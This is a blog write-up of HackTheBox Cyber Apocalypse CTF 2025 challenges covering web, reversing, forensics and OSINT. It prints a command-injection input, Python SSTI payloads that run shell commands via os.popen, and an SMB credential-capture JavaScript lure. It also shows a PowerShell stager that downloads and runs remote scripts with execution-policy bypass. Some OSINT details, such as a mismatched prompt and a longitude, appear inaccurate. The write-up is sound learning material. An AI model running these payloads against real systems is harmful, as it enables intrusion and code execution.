---
title: Cyber Apocalypse CTF 2025 - HackTheBox
description: My journey in HackTheBox Cyber Apocalypse CTF 2025 is fun and challenging, I gain some new knowledge and realization. I only managed to solved very easy - medium challenges from various categories. I also tackle some challenges but got stuck due to lack of knowledge and not thinking critically. This indicates my current knowledge and areas I need to improve to become better. In this writeup i didn't include AI and Coding category i solved.
author:
date: 2025-03-26 06:10:00 +0800
categories: [CTF, HTB, Web, Rev, Forensics, Osint]
tags: [writeup]
image:
  path: /assets/posts/og-image.jpg
  alt: Cyber Apocalypse CTF 2025 HTB
---

# Web
#### Whispers of the Moonbeam
In the heart of Valeria's bustling capital, the Moonbeam Tavern stands as a lively hub of whispers, wagers, and illicit dealings. Beneath the laughter of drunken patrons and the clinking of tankards, it is said that the tavern harbors more than just ale and merriment—it is a covert meeting ground for spies, thieves, and those loyal to Malakar's cause. The Fellowship has learned that within the hidden backrooms of the Moonbeam Tavern, a crucial piece of information is being traded—the location of the Shadow Veil Cartographer, an informant who possesses a long-lost map detailing Malakar’s stronghold defenses. If the fellowship is to stand any chance of breaching the Obsidian Citadel, they must obtain this map before it falls into enemy hands.

![](/assets/posts/cyberApocalypse/assets/web/whisper1.png)

`Tip: Use ↑↓ for history, Tab for completion, ; for command injection`

![](assets/posts/cyberApocalypse/assets/web/whisper2.png)

```
gossip; cat flag.txt

HTB{Sh4d0w_3x3cut10n_1n_Th3_M00nb34m_T4v3rn_56d7699bf9a8a5064a683945a7815be2}
```

![](assets/posts/cyberApocalypse/assets/web/whisper3.png)

**Conclusion:** the web is vulnerable to command injection.

#### Trial by Fire
As you ascend the treacherous slopes of the Flame Peaks, the scorching heat and shifting volcanic terrain test your endurance with every step. Rivers of molten lava carve fiery paths through the mountains, illuminating the night with an eerie crimson glow. The air is thick with ash, and the distant rumble of the earth warns of the danger that lies ahead. At the heart of this infernal landscape, a colossal Fire Drake awaits—a guardian of flame and fury, determined to judge those who dare trespass. With eyes like embers and scales hardened by centuries of heat, the Fire Drake does not attack blindly. Instead, it weaves illusions of fear, manifesting your deepest doubts and past failures. To reach the Emberstone, the legendary artifact hidden beyond its lair, you must prove your resilience, defying both the drake’s scorching onslaught and the mental trials it conjures. Stand firm, outwit its trickery, and strike with precision—only those with unyielding courage and strategiAc mastery will endure the Trial by Fire and claim their place among the legends of Eldoria.

![](assets/posts/cyberApocalypse/assets/web/fire1.png)

In this challenge, we have a prompt based from this we can identify if its vulnerable to some kind of injections. I test several injection techniques, until I found a SSTI with this payload.
```python
{% raw %}{{7*7}} //result will be 49{% endraw %}
```
```
<input type="text" id="warrior_name" name="warrior_name" class="nes-input" required="" placeholder="Enter your name..." maxlength="30" style="background-color: rgba(17, 24, 39, 0.95);">
```
Testing SST payloads from [ssti payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md), but the thing is the input have character limits. Based from the source code its 30 characters max length.

To bypass this we can modify the maxlength in dev tools, leave it as blank. Then inject our SSTi payload into name input to read the current directory of the system.
``` python
{% raw %}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}{% endraw %}
```

![](assets/posts/cyberApocalypse/assets/web/fire2.png)

We got the flag :)
``` python
{% raw %}{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}{% endraw %}
```
![](assets/posts/cyberApocalypse/assets/web/fire3.png)
![](assets/posts/cyberApocalypse/assets/web/fire4.png)
![](assets/posts/cyberApocalypse/assets/web/fire5.png)

# Reverse Engineering
#### SealedRune
Elowen has reached the Ruins of Eldrath, where she finds a sealed rune stone glowing with ancient power. The rune is inscribed with a secret incantation that must be spoken to unlock the next step in her journey to find The Dragon’s Heart.

```
strings challenge  
...
[1;34m
 The ancient rune shimmers with magical energy... 
Enter the incantation to reveal its secret: 
%49s
;*3$"
LmB9ZDNsNDN2M3JfYzFnNG1fM251cntCVEhgIHNpIGxsZXBzIHRlcmNlcyBlaFQ=
emFyZmZ1bkdsZWFW
GCC: (GNU) 14.2.1 20250207
main.c
_DYNAMIC
__GNU_EH_FRAME_HDR
_GLOBAL_OFFSET_TABLE_
...
```
![](assets/posts/cyberApocalypse/assets/rev/rune1.png)
```
LmB9ZDNsNDN2M3JfYzFnNG1fM251cntCVEhgIHNpIGxsZXBzIHRlcmNlcyBlaFQ=
```
![](assets/posts/cyberApocalypse/assets/rev/rune2.png)
```
.`}d3l43v3r_c1g4m_3nur{BTH` si lleps terces ehT
```
![](assets/posts/cyberApocalypse/assets/rev/rune3.png)

#### Encrypted scroll
Elowen Moonsong, an Elven mage of great wisdom, has discovered an ancient scroll rumored to contain the location of The Dragon’s Heart. However, the scroll is enchanted with an old magical cipher, preventing Elowen from reading it.

![](assets/posts/cyberApocalypse/assets/rev/scroll1.png)

The challenge give us a executable file, lets open this in ghidra to analyze the file.

![](assets/posts/cyberApocalypse/assets/rev/scroll2.png)

In decrypt_message function, we can see how the file works. 
```
void decrypt_message(char *param_1)

{
  int iVar1;
  long in_FS_OFFSET;
  int local_3c;
  undefined8 local_38;
  undefined4 local_30;
  undefined4 uStack_2c;
  undefined4 uStack_28;
  undefined8 local_24;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_38 = 0x716e32747c435549;
  local_30 = 0x6760346d;
  uStack_2c = 0x6068356d;
  uStack_28 = 0x75327335;
  local_24 = 0x7e643275346e69;
  for (local_3c = 0; *(char *)((long)&local_38 + (long)local_3c) != '\0'; local_3c = local_3c + 1) {
    *(char *)((long)&local_38 + (long)local_3c) = *(char *)((long)&local_38 + (long)local_3c) + -1;
  }
  iVar1 = strcmp(param_1,(char *)&local_38);
  if (iVar1 == 0) {
    puts("The Dragon\'s Heart is hidden beneath the Eternal Flame in Eldoria.");
  }
  else {
    puts("The scroll remains unreadable... Try again.");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

```
local_38 = 0x716e32747c435549;
local_30 = 0x6760346d;
uStack_2c = 0x6068356d;
uStack_28 = 0x75327335;
local_24 = 0x7e643275346e69;
```
These variables contain the encrypted password.

```
for (local_3c = 0; *(char *)((long)&local_38 + (long)local_3c) != '\0'; local_3c = local_3c + 1) {
    *(char *)((long)&local_38 + (long)local_3c) = *(char *)((long)&local_38 + (long)local_3c) + -1;
}
```
The function decrements each byte of the stored password by `1` to get the correct password.

```python
import struct

# Encrypted hex values stored in memory
encrypted_hex = [
    0x716e32747c435549,
    0x6760346d,
    0x6068356d,
    0x75327335,
    0x7e643275346e69
]

# Convert to bytes and decrypt by subtracting 1 from each byte
decrypted_bytes = b''.join(
    struct.pack("<Q", value)[:8] if isinstance(value, int) and value >= 0x100000000 else struct.pack("<I", value)[:4]
    for value in encrypted_hex
)

# Reverse the +1 encryption by subtracting 1 from each byte safely
decrypted_bytes = bytes((b - 1) % 256 for b in decrypted_bytes)

# Convert to string
decrypted_flag = decrypted_bytes.decode(errors="ignore")
print(decrypted_flag)
```

```python
HTB{s1mpl3_fl4g_4r1thm3t1c}
```
**Conclusion:** Converts hex values into bytes, subtracts 1 from each byte to decrypt, and decodes the result into a readable string (the flag).

# Forensics
#### A New Hire
The Royal Archives of Eldoria have recovered a mysterious document—an old resume once belonging to Lord Malakar before his fall from grace. At first glance, it appears to be an ordinary record of his achievements as a noble knight, but hidden within the text are secrets that reveal his descent into darkness.

![](assets/posts/cyberApocalypse/assets/forensics/hire1.png)

inspecting the page, we found a malicious script.

![](assets/posts/cyberApocalypse/assets/forensics/hire2.png)

The exploit appears to involve **capturing SMB credentials** via a malicious JavaScript payload. The key part of the attack is in this function:

``` javascript
function getResume() {
      window.location.href=`search:displayname=Downloads&subquery=\\\\${window.location.hostname}@${window.location.port}\\3fe1690d955e8fd2a0b282501570e1f4\\resumes\\`;
    }
```
visiting the directory, we can find some other directories. Enumerating each directories until we got the flag.

![](assets/posts/cyberApocalypse/assets/forensics/hire3.png)
![](assets/posts/cyberApocalypse/assets/forensics/hire4.png)

from config/client.py we got some key, decoding this will get us the flag. 

![](assets/posts/cyberApocalypse/assets/forensics/hire5.png)

``` python
key = base64.decode("SFRCezRQVF8yOF80bmRfbTFjcjBzMGZ0X3MzNHJjaD0xbjF0MTRsXzRjYzNzISF9Cg==")
```
![](assets/posts/cyberApocalypse/assets/forensics/hire6.png)

#### Thorin's Amulet
Garrick and Thorin’s visit to Stonehelm took an unexpected turn when Thorin’s old rival, Bron Ironfist, challenged him to a forging contest. In the end Thorin won the contest with a beautifully engineered clockwork amulet but the victory was marred by an intrusion. Saboteurs stole the amulet and left behind some tracks. Because of that it was possible to retrieve the malicious artifact that was used to start the attack. Can you analyze it and reconstruct what happened? Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service.

``` bash
cat artifact.ps1           
function qt4PO {
    if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
}
qt4PO
```

decoding the command
```bash
( New-Object Net.WebClient ).DownloadString("http://korp.htb/update")
```

host file
``` bash
echo "83.136.251.68 korp.htb" | sudo tee -a /etc/hosts
```

``` bash
curl -v http://korp.htb:57732/update

* Host korp.htb:57732 was resolved.
* IPv6: (none)
* IPv4: 83.136.251.68
*   Trying 83.136.251.68:57732...
* Connected to korp.htb (83.136.251.68) port 57732
* using HTTP/1.x
> GET /update HTTP/1.1
> Host: korp.htb:57732
> User-Agent: curl/8.11.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: Werkzeug/3.1.3 Python/3.13.2
< Date: Sat, 22 Mar 2025 03:52:48 GMT
< Content-Disposition: inline; filename=update.ps1
< Content-Type: application/octet-stream
< Content-Length: 222
< Last-Modified: Wed, 26 Feb 2025 17:58:10 GMT
< Cache-Control: no-cache
< ETag: "1740592690.0-222-1138558671"
< Date: Sat, 22 Mar 2025 03:52:48 GMT
< Connection: close
< 
function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
}
aqFVaq
```

```bash
$ curl -H "X-ST4G3R-KEY: 5337d322906ff18afedc1edc191d325d" http://korp.htb:57732/a541a -o a541a.ps1

  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   169  100   169    0     0    363      0 --:--:-- --:--:-- --:--:--   363
```

```bash
$ cat a541a.ps1 
$a35 = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"
($a35-split"(..)"|?{$_}|%{[char][convert]::ToInt16($_,16)}) -join ""
```

```python
# Hex-encoded string
hex_string = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"

# Convert hex string to ASCII text
decoded_flag = bytes.fromhex(hex_string).decode("utf-8")
print(decoded_flag)
```

```
HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}
```

#### Silent Trap
A critical incident has occurred in Tales from Eldoria, trapping thousands of players in the virtual world with no way to log out. The cause has been traced back to Malakar, a mysterious entity that launched a sophisticated attack, taking control of the developers' and system administrators' computers. With key systems compromised, the game is unable to function properly, which is why players remain trapped in Eldoria. Now, you must investigate what happened and find a way to restore the system, freeing yourself from the game before it's too late.

##### Flags
1. What is the subject of the first email that the victim opened and replied to?
```
frame contains "email"
```
![](assets/posts/cyberApocalypse/assets/forensics/trap1.png)
follow tcp the first one
![](assets/posts/cyberApocalypse/assets/forensics/trap2.png)
![](assets/posts/cyberApocalypse/assets/forensics/trap3.png)
```
Game Crash on Level 5
```
2. On what date and time was the suspicious email sent? (Format: YYYY-MM-DD_HH:MM) (for example: 1945-04-30_12:34)
based from earlier, `shadowblade@email.com` must be the suspicious email. Filter it then follow the first tcp 
![](assets/posts/cyberApocalypse/assets/forensics/trap4.png)
![](assets/posts/cyberApocalypse/assets/forensics/trap5.png)
```
2025-02-24_15:46
```
2. What is the MD5 hash of the malware file?
	 i found the malware but i got stuck getting the md5 hash because the file is password protected. After the event ended, reading from other writeup the password is already in front of my eyes. Lesson learned, Think critically and observe more.
3. What credentials were used to log into the attacker's mailbox? (Format: username:password)
4. What is the name of the task scheduled by the attacker?
5. What is the API key leaked from the highly valuable file discovered by the attacker?

# OSINT
#### Echoes in Stones
Deep in her sanctum beneath Eldoria's streets, Nyla arranges seven crystalline orbs in a perfect circle. Each contains a different vision of stone battlements and weathered walls—possible matches for the mysterious fortress the Queen seeks in the southern kingdoms of Chile. The image in her central crystal pulses with ancient power, showing a majestic citadel hidden among the distant Chilean mountains. Her fingers dance across each comparison crystal, her enchanted sight noting subtle architectural differences between the visions. The runes along her sleeves glow more intensely with each elimination until only one crystal remains illuminated. As she focuses her magical threads on this final vision, precise location runes appear in glowing script around the orb. Nyla smiles in satisfaction as the fortress reveals not just its position, but its true name and history. A more challenging mystery solved by Eldoria's premier information seeker, who knows that even the most distant fortifications cannot hide their secrets from one who compares the patterns of stone and shadow.  
**HTB{street_number_exactzipcode_city_with_underscores_region}  
Example: HTB{Libertad_102_2520000_Viña_del_Mar_Valparaíso} Use underscores between words and include special characters where appropriate**
![](/assets/posts/cyberApocalypse/assets/osint/echoesinthestone.png)
https://www.discoverboynevalley.ie/boyne-valley-drive/heritage-sites/monasterboice-high-crosses-and-monastic-site
![](/assets/posts/cyberApocalypse/assets/osint/stone1.png)
```
HTB{Muiredach_High_Cross}
```

#### The Ancient Citadel
Deep in her sanctum beneath Eldoria's streets, Nyla arranges seven crystalline orbs in a perfect circle. Each contains a different vision of stone battlements and weathered walls—possible matches for the mysterious fortress the Queen seeks in the southern kingdoms of Chile. The image in her central crystal pulses with ancient power, showing a majestic citadel hidden among the distant Chilean mountains. Her fingers dance across each comparison crystal, her enchanted sight noting subtle architectural differences between the visions. The runes along her sleeves glow more intensely with each elimination until only one crystal remains illuminated. As she focuses her magical threads on this final vision, precise location runes appear in glowing script around the orb. Nyla smiles in satisfaction as the fortress reveals not just its position, but its true name and history. A more challenging mystery solved by Eldoria's premier information seeker, who knows that even the most distant fortifications cannot hide their secrets from one who compares the patterns of stone and shadow.  
**HTB{street_number_exactzipcode_city_with_underscores_region}  
Example: HTB{Libertad_102_2520000_Viña_del_Mar_Valparaíso} Use underscores between words and include special characters where appropriate
![](/assets/posts/cyberApocalypse/assets/osint/ancientcitadel.png)
![](/assets/posts/cyberApocalypse/assets/osint/citadel1.png)
```
HTB{Iberia_104_2571409_Viña_del_Mar_Valparaíso}
```

#### The Mechanical Bird Nest
In the highest tower of Eldoria's archives, Nyla manipulates a crystal scrying glass, focusing on a forbidden fortress in the desert kingdoms. The Queen's agents have discovered a strange mechanical bird within the fortress walls—an unusual flying machine whose exact position could reveal strategic secrets. Nyla's fingers trace precise measurement runes across the crystal's surface as the aerial image sharpens. Her magical lattice grid overlays the vision, calculating exact distances and positions. The blue runes along her sleeves pulse rhythmically as coordinates appear in glowing script. Another hidden truth uncovered by the realm's premier information seeker, who knows that even the most distant secrets cannot hide from one who sees with magical precision.  
**The Mechanical Bird’s Nest: HTB{XX.XXX_-XXX.XXX}  
Example: HTB{48.858_-222.294} Latitude and longitude format with a dash separating the coordinates**
![](/assets/posts/cyberApocalypse/assets/osint/birdnest.png)
![](/assets/posts/cyberApocalypse/assets/osint/area.png)
![](/assets/posts/cyberApocalypse/assets/osint/area51.png)
```
HTB{37.247_-155.812}
```

#### The Shadowed Sigil
In the central chamber of Eldoria's Arcane Archives, Nyla studies a glowing sigil captured by the royal wardens. The ethereal marking—"139.5.177.205"—pulsates with malicious energy, having appeared in multiple magical breaches across the realm. Her fingers trace the sigil's unique pattern as her network of crystals begins to search through records of known dark covens and their magical signatures. The runes along her sleeves flash with recognition as connections form between seemingly unrelated incidents. Each magical attack bears the same underlying pattern, the same arcane origin. Her enchanted sight follows the magical threads backward through time and space until the name of a notorious cabal of shadow mages materializes in glowing script. Another dangerous secret revealed by Eldoria's master information seeker, who knows that even the most elusive malefactors leave traces of their magic for those skilled enough to recognize their unique signature.  
**HTB{APTNumber}  
Example: HTB{APT01} No special characters

google 139.5.177.205
![](/assets/posts/cyberApocalypse/assets/osint/shadowsigil.png)
```
HTB{APT28}
```

#### The Stone That Whispers
In the twilight archives of Eldoria, Nyla studies an image of a mysterious monument. Her enchanted crystals glow as she traces ancient maps with rune-covered fingers. The stone atop the hill of kings calls to her, its secrets hidden in scattered records across realms. As her magical threads of knowledge connect, the true name emerges in glowing script: "The Stone of Destiny." Another mystery solved by the realm's most skilled information seeker, who knows that every artifact leaves traces for those who can read the signs.  
**HTB{Name_Object}  
Example: HTB{Pia_Pail} No special characters
![](/assets/posts/cyberApocalypse/assets/osint/echoesinthestone.png)
https://en.wikipedia.org/wiki/Hill_of_Tara
![](/assets/posts/cyberApocalypse/assets/osint/echostone.png)
```
HTB{Lia_Fail}
```

![](/assets/posts/solorunnt.png)
